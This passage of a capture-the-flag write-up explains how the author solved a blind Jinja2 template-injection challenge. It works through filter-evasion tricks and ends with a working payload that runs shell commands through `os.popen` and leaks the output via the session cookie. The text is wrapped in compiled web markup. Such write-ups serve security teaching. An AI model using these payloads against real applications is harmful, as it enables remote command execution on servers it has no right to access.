punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"\u003e \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"check_filter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"[.] \"'}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'.'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"[/] \"'}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'/'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"[:] \"'}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"count\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"':'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"[Len] \"'}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"len\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"input\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"So, to summarize, we have a blind SSTI with some interesting blacklist and length limited.\"}),`\n`,(0,n.jsx)(e.p,{children:\"We can make a small skeleton for our payload.\"}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[`\n`,(0,n.jsxs)(e.p,{children:[\"It\\u2019s a blind SSTI, we don\\u2019t really choices here, it\\u2019s either making it timing based which can take some space in the payload or just simply creating a new cookie to exfiltrate data using \",(0,n.jsx)(e.code,{children:\"session.update\"})]}),`\n`]}),`\n`,(0,n.jsxs)(e.li,{children:[`\n`,(0,n.jsxs)(e.p,{children:[(0,n.jsx)(e.code,{children:\"{{\"}),\" and \",(0,n.jsx)(e.code,{children:\"}}\"}),\" are filtered, so we\\u2019ll probably use \",(0,n.jsx)(e.code,{children:\"{%\"})]}),`\n`]}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"So, for now our payload will be something like that\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" session\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"update\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'f'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\"somepayload\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),\"endif\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})})}),`\n`,(0,n.jsxs)(e.p,{children:[\"At this point, we\\u2019re more limited in the actual length of our payload. While i was searching for a smaller payload i came a cross \",(0,n.jsxs)(e.a,{href:\"https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/GreHack_2021_-_Optimizing_Server_Side_Template_Injections_payloads_for_jinja2_slides.pdf\",children:[\"a presentation from \",(0,n.jsx)(e.code,{children:\"Grehack 2021\"}),\" by @Podalirius\"]}),`\nwhich has some interesting payloads and they\\u2019re can be found in `,(0,n.jsx)(e.a,{href:\"https://github.com/swisskyrepo/PayloadsAllTheThings\",children:\"PayloadsAllTheThings\"}),\".\"]}),`\n`,(0,n.jsx)(e.p,{children:\"I\\u2019ll be using another payload later because of the length limit issue, This is how I originally started the challenge. They\\u2019ll be in use for the next challenge.\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"cycler\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"__init__\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"__globals__\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"os\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"popen\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'id'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"read\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"joiner\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"__init__\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"__globals__\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"os\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"popen\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'id'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"read\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"namespace\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"__init__\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"__globals__\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"os\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"popen\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'id'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"read\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"I\\u2019ll continue with the first one and to make it easier to deal with blacklisted words and also the count of dots. I\\u2019ll change it to this format\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"cycler\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__init__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__globals__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'os'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'popen'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'id'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'read'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsxs)(e.p,{children:[\"First, i tried to use \",(0,n.jsx)(e.code,{children:\"[::-1]\"}),\" to reverse the string, then i remembered that digits were filtered. we also can't use \",(0,n.jsx)(e.code,{children:\"+\"}),\" to concatenate the strings as it was filtered\"]}),`\n`,(0,n.jsx)(e.p,{children:\"I tried to use format string with int() but ended up failing. - Completely overthinking it\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-python\",children:(0,n.jsxs)(e.code,{className:\"language-python code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" Template\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:`\"My name is {{cycler['__tini__'[::-1]]['__slabolg__'[::-1]].os.popen('id').read()}}\"`}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"render\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token string\",children:\"'My name is uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floopy),27(sudo),29(audio),30(dip),142(kaboxer)\\\\n'\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"So, the idea here is pretty simple and basically we need to us an empty space between the blacklisted strings.\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"cycler\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__in'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'it__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__glo'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'bals__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'os'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'popen'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'id'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'rea'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'d'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.pre,{className:\"language-python\",children:(0,n.jsxs)(e.code,{className:\"language-python code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\"}),\" Template\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:`\"My name is {{cycler[r['__in' 'it__']['__glo' 'bals__'].os.popen('id').read()}}\"`}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"render\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token string\",children:\"'My name is uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floopy),27(sudo),29(audio),30(dip),142(kaboxer)\\\\n'\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"At this point, we\\u2019re pretty much over.\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" session\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"update\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'f'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\"cycler\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__in'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'it__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__glo'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'bals__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'os'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'popen'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'tail /flag'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'re'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'ad'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),\"endif\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.pre,{className:\"language-shell\",children:(0,n.jsxs)(e.code,{className:\"language-shell code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`$ python3 check_filterz.py\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"input: \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),\"%if session.update\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'f'\"}),\":cycler\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__in'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'it__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__glo'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'bals__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'os'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'popen'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'tail /flag'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'re'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'ad'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),\"%endif%\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\".\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\":\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"/\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"%\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"len\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"116\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The only problem here, is that we\\u2019re exceeding the length limit. This is where I got stuck, I kept searching and fuzzing for smaller payloads and ended up using \",(0,n.jsx)(e.code,{children:\"lipsum\"}),\".\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"lipsum\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"__globals__\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"__os__\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"__popen__\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'id'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"read\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"I then transformed it:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"lipsum\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__glo'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'bals__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'os'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'popen'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'tail /flag'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'re'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'ad'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"Our final payload is:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" session\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"update\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'f'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),\"lipsum\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__glo'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'bals__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'os'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'popen'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'tail /flag'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'re'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'ad'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),\"endif\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.pre,{className:\"language-shell\",children:(0,n.jsxs)(e.code,{className:\"language-shell code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`$ python3 check_filterz.py\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"input: \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),\"%if session.update\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'f'\"}),\":lipsum\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__glo'\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'bals__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token 